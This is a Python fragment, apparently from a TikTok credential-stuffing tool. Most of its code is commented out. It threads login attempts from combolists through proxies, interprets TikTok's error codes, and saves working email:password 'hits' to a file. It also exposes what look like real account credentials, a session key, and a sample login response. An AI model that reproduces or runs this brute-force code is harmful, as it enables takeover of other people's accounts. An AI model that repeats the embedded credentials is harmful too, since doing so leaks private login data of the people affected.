    x = "hamishrobinson24@icloud.com:Graphite24"
    print(len(x))
    
    for x in range(10):
        email = "".join(random.choices("efzgzegzgzg", k=random.randint(8, 13))) + "@gmail.com"
        
        # factor = 1
        # if len(email) == 38: factor = 1
        
        factor = Utils._factor(email)

        print(f"hit : {email} {' ' * factor} [ x - x ]")
# def title_loop():
#     if os.name == "nt":
#         while True:
#             os.system(f"title TikTok Brute ^| hits: {_hits} ^| fails: {_fails} ^| checks: {_checks}")
#             time.sleep(0.5)

# _hits    = 0
# _fails   = 0
# _checks  = 0
# proxies  = open('./data/proxies.txt', 'r', encoding="utf8").read().splitlines()

# def brute(email, password):
#     global _checks, _hits, _fails
#     error_codes = {
#         7    : "Too many attempts. Try again later.",
#         17   : "Login failed",
#         1108 : "Too many attempts on same ip/account",
#         1009 : "Incorrect account or password",
#         1011 : "Not registered yet",
#         1107 : "Incorrect account or password",
#         1381 : "Update TikTok app",
#         2033 : "Failed Captcha"
#     }

#     start    = time.time()
#     # device   = Xlog(proxy = random.choice(proxies)).validate_device()
#     device = Xlog().validate_device()
#     # _mode = "email" if "@" in email else "username"
#     _mode = "email"
#     login_response = Bruteforce(device).login(_mode, email, password)
#     _checks += 1
    
#     print(login_response.json())
#     if login_response.json()['data'].get('error_code') is None:
#         with open("data/hits.txt", "a") as file:
#             file.write(f"{email}:{password}\n")
#         print(
#             Utils.sprint(
#                 "*", str(_checks), "Bruted successfully: {}{}{} {}s".format(
#                     Col.blue, email, Col.reset, round(time.time() - start, 1)
#                 )
#             )
#         )
    
#     elif login_response.json()['data'].get('error_code') == 2046:
#         with open("data/hits.txt", "a") as file:
#             file.write(f"{email}:{password}\n")
#         print(
#             Utils.sprint(
#                 "*", str(_checks), "Bruted successfully: {}{}{} {}s".format(
#                     Col.blue, email, Col.reset, round(time.time() - start, 1)
#                 )
#             )
#         )

#     else:
#         if login_response.json()['data'].get('error_code') in error_codes:
#             print(
#                 Utils.sprint(
#                     "x", str(_checks), error_codes[
#                     login_response.json()['data'].get('error_code')
#                 ])
#             )
#         else:
#             print(login_response.json())

# if __name__ == "__main__":
#     # threading.Thread(target=title_loop).start()

#     # combos   =  open('./data/combolist.txt', 'r', encoding="utf8").read().splitlines()
#     # device   = Xlog().validate_device() #proxy = random.choice(proxies)).validate_device()
#     # # Bruteforce(device).start(combos, 1)
    
#     # brute("kebedok659@farerata.com", "@dodi012")

#     # # index = 0
#     # # while index < len(combos):
#     # #     if threading.active_count() < 500:
#     # #         threading.Thread(
#     # #             target = brute, 
#     # #             args = combos[index].split(":")
#     # #         ).start()
#     # #         index += 1
    

#     data = {
#         "data":{
#             "app_id":1340,
#             "avatar_url":"",
#             "cloud_token":"",
#             "connects":[
                
#             ],
#             "country_code":0,
#             "device_id":0,
#             "email":"k***9@farerata.com",
#             "email_collected":True,
#             "expired_uid_list":"None",
#             "has_password":1,
#             "is_kids_mode":0,
#             "is_only_bind_ins":False,
#             "mobile":"",
#             "name":"user9700426245248",
#             "need_device_create":0,
#             "need_ttwid_migration":0,
#             "new_user":0,
#             "old_user_id":7070170126561068058,
#             "old_user_id_str":"7070170126561068058",
#             "phone_collected":False,
#             "screen_name":"user9700426245248",
#             "sec_old_user_id":"MS4wLjABAAAAVVMJMr2H7R2w1w-GzM4tJ9-r0Y9U0bpo-aEUrppmY8FKLABOHiQdz6xlUpmQ3gEX",
#             "sec_user_id":"MS4wLjABAAAAVVMJMr2H7R2w1w-GzM4tJ9-r0Y9U0bpo-aEUrppmY8FKLABOHiQdz6xlUpmQ3gEX",
#             "session_key":"cce4aef115c0a5906b896d9ad195a871",
#             "user_device_record_status":0,
#             "user_id":7070170126561068058,
#             "user_id_str":"7070170126561068058",
#             "user_verified":False
#         },
#         "message":"success",
#     }

# email = "rfrfrffr"
# passw = "rfrfrfrf"

# print(f"@{data['data']['name']} | {email}:{passw} - Followers: 1 - Verified: {data['data']['user_verified']} - Email: {data['data']['email_collected']} - Phone: {data['data']['phone_collected']}")